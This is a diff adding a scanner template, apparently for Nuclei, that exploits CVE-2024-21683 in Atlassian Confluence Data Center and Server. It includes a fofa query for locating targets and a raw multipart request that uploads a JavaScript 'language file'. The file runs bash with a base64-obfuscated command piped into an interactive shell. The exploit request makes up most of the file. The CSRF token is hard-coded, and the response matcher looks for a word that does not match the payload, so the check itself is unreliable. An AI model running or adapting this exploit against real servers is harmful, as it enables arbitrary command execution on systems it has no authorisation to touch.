@@ -1,0 +1,45 @@
+id: atlassian-confluence-center-server-rce
+
+info:
+  name: "Atlassian Confluence Data Center and Server 远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="-305179312"
+          Atlassian Confluence是澳大利亚Atlassian公司开发的企业级知识管理与协作平台，支持企业Wiki构建与团队协作。该产品Data Center和Server版本中存在远程代码执行（RCE）缺陷，攻击者在通过身份验证后可利用此漏洞在目标服务器上执行任意系统命令。该漏洞源于应用程序对用户输入参数的过滤机制存在缺陷，导致恶意代码注入成为可能。
+  reference:
+  - CVE-2024-21683
+  tags: Atlassian
+
+http:
+- raw:
+  - |
+    POST /admin/plugins/newcode/addlanguage.action HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+    Content-Type: multipart/form-data; boundary=690dd62eb49730d16f0a919d8736b152
+
+    --690dd62eb49730d16f0a919d8736b152
+    Content-Disposition: form-data; name="atl_token"
+
+    5f3858f23482a684c830413b21f7560bed86fdf8
+    --690dd62eb49730d16f0a919d8736b152
+    Content-Disposition: form-data; name="newLanguageName"
+
+    test
+    --690dd62eb49730d16f0a919d8736b152
+    Content-Disposition: form-data; name="languageFile"; filename="exploit.js"
+    Content-Type: text/javascript
+     
+    new java.lang.ProcessBuilder["(java.lang.String[])"](["bash","-c","{echo,RHVkZVN1aXRl}|{base64,-d}|{bash,-i}"]).start()
+    --690dd62eb49730d16f0a919d8736b152--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
